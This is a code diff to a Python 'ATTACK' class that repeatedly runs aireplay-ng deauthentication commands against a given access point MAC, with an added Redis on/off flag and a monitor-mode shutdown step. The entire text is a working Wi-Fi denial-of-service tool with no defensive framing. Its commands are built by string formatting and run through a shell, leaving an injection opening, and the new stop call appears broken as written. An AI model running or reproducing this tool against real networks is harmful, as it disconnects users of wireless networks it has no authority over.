@@ -6,6 +6,7 @@ create by swm
 """
 from subprocess import call
 import time
+import redis
 
 
 class ATTACK:
@@ -22,10 +23,16 @@ class ATTACK:
         return
 
     def startattack(self):
-        while True:
-            cmd = 'aireplay-ng --deauth 10 -a {} {}mon'.format(self.mac, self.wlanname)
+        r = redis.Redis(host="localhost", port=6379)
+        r.hset('attack', 'statu', 1)
+        attack = r.hget('attack', 'statu')
+        while int(attack) == 1:
+            cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
             call(cmd, shell=True)
             time.sleep(0.2)
+            attack = r.hget('attack', 'statu')
+        else:
+            call('airmon-ng stop {}mon'.format(self.wlanname))
 
     def start(self):
         # 1、开启airmongo
